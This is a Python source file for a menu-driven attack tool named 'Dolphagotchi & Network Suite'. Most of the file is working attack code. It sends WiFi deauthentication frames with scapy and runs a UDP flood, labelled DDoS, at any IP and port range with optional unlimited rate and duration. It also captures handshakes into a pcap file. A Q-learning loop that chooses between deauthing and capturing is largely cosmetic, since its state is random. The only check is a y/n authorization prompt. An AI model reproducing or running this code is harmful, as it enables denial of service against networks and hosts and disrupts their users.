import sys
import time
import socket
import random
import subprocess
import platform
import os
from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt, sniff, wrpcap, sendp
import numpy as np


def display_gui():
    gui = """
     ______   ______              ______     _          
    |_   _ `.|_   _ `.          .' ____ \\  (_)          
      | | `. \\ | | `. \\  .--.  | (___ \\_| __   _ .--.   
      | |  | | | |  | |/ .'`\\ \\ _.____`. [  | [ `/'`\\]  
     _| |_.' /_| |_.' /| \\__.|| \\____) | | |  | |     
    |______.'|______.'  '.__.'  \\______.'[___][___]    
           Dolphagotchi & Network Suite v2.2
                 By mr.flip
    """
    print(gui)


class RLAgent:
    def __init__(self, num_networks):
        self.q_table = np.zeros((num_networks, 2))
        self.learning_rate = 0.1
        self.discount_factor = 0.9
        self.epsilon = 1.0  
        self.epsilon_decay = 0.99

    def select_action(self, state):
        if random.uniform(0, 1) < self.epsilon:
            return random.choice([0, 1])
        return np.argmax(self.q_table[state])

    def update_q_value(self, state, action, reward, next_state):
        best_next_action = np.argmax(self.q_table[next_state])
        self.q_table[state, action] += self.learning_rate * (
            reward + self.discount_factor * self.q_table[next_state, best_next_action] - self.q_table[state, action]
        )

    def decay_epsilon(self):
        self.epsilon *= self.epsilon_decay


def wifi_scan():
    print("\nPerforming WiFi scan...")
    try:
        os_type = platform.system()
        if os_type == "Linux":
            scan_command = "sudo iwlist wlan0 scan"
        elif os_type == "Windows":
            scan_command = "netsh wlan show networks"
        elif os_type == "Darwin":
            scan_command = "airport -s"
        else:
            print("Unsupported OS for WiFi scanning.")
            return []

        output = subprocess.check_output(scan_command, shell=True, text=True)
        networks = [line.strip() for line in output.split("\n") if line.strip()]
        return networks[:5]

    except subprocess.CalledProcessError as e:
        print(f"WiFi scan error: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")
    return []


def wifi_deauth_attack(bssid, client_mac):
    print(f"\nAttempting Deauth Attack on {bssid} targeting {client_mac}...")
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()
    try:
        sendp(packet, iface="wlan0mon", count=10, inter=0.1)
        print("Deauth Attack sent.")
    except Exception as e:
        print(f"Error: {e}")

def ddos_attack(ip, ip_version, start_port, end_port, packet_size, rate_limit, duration):
    sock = socket.socket(ip_version, socket.SOCK_DGRAM)
    bytes_data = random._urandom(packet_size)
    sent = 0
    start_time = time.time()

    print("\nStarting DDoS Attack...")
    try:
        while True:
            if duration and (time.time() - start_time >= duration):
                print("DDoS Attack completed.")
                break
            for port in range(start_port, end_port + 1):
                sock.sendto(bytes_data, (ip, port))
                sent += 1
                print(f"Sent {sent} packets to {ip} on port {port}")
                if rate_limit > 0:
                    time.sleep(1 / rate_limit)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()
        print(f"Attack completed. Total packets sent: {sent}")

def dolphagotchi_handshake_capture(interface, output_file):
    print(f"\nCapturing handshakes on {interface}...")
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            print(f"Beacon from {pkt[Dot11].addr2}")
        if pkt.haslayer(Dot11Elt) and pkt.type == 2 and pkt.subtype == 8:
            print(f"Captured handshake from {pkt[Dot11].addr2}")
            wrpcap(output_file, pkt, append=True)

    try:
        sniff(iface=interface, prn=packet_handler, timeout=60)
        print(f"Handshake capture completed. Saved to {output_file}")
    except KeyboardInterrupt:
        print("Handshake capture stopped by user.")
    except Exception as e:
        print(f"Error: {e}")


def wifi_dolphagotchi_feature():
    print("\nStarting Dolphagotchi simulation with RL...")
    agent = RLAgent(num_networks=5)
    interface = input("Enter WiFi interface (e.g., wlan0mon): ")
    output_file = input("Enter output file for handshakes (e.g., handshakes.pcap): ")

    try:
        while True:
            networks = wifi_scan()
            if not networks:
                print("No networks found. Scanning again...")
                continue

            for i, network in enumerate(networks):
                print(f"Network {i}: {network}")

            state = random.choice(range(len(networks)))
            action = agent.select_action(state)

            if action == 0:
                print("Agent decided to scan and capture handshakes.")
                dolphagotchi_handshake_capture(interface, output_file)
                reward = 10
            else:
                bssid = "00:11:22:33:44:55"
                client_mac = "ff:ff:ff:ff:ff:ff"
                wifi_deauth_attack(bssid, client_mac)
                reward = 5

            next_state = random.choice(range(len(networks)))
            agent.update_q_value(state, action, reward, next_state)
            agent.decay_epsilon()

            time.sleep(2)
    except KeyboardInterrupt:
        print("\nDolphagotchi stopped.")
    except Exception as e:
        print(f"Error: {e}")


def main():
    display_gui()
    print("WARNING: Use this tool for authorized testing and educational purposes only.")
    confirm = input("Do you have proper authorization? (y/n): ")
    if confirm.lower() != "y":
        print("Exiting. Ensure proper authorization.")
        sys.exit()

    while True:
        print("\nOptions:")
        print("1. Dolphagotchi")
        print("2. WiFi Deauthentication Attack")
        print("3. WiFi Scan")
        print("4. DDoS")
        print("5. Quit")
        choice = input("Enter your choice (1-5): ")

        if choice == '1':
            wifi_dolphagotchi_feature()
        elif choice == '2':
            bssid = input("Enter BSSID: ")
            client_mac = input("Enter client MAC (leave blank for all): ") or "ff:ff:ff:ff:ff:ff"
            wifi_deauth_attack(bssid, client_mac)
        elif choice == '3':
            wifi_scan()
        elif choice == '4':
            ip = input("Enter target IP: ")
            start_port = int(input("Enter start port: "))
            end_port = int(input("Enter end port: "))
            packet_size = int(input("Enter packet size (bytes): "))
            rate_limit = float(input("Packets per second (0 for unlimited): "))
            duration = int(input("Duration (seconds, 0 for unlimited): "))
            ddos_attack(ip, socket.AF_INET, start_port, end_port, packet_size, rate_limit, duration)
            
        elif choice == '5':
            print("Goodbye!")
            break

        else:
            print("Invalid choice. Try again.")


if __name__ == "__main__":
    main()
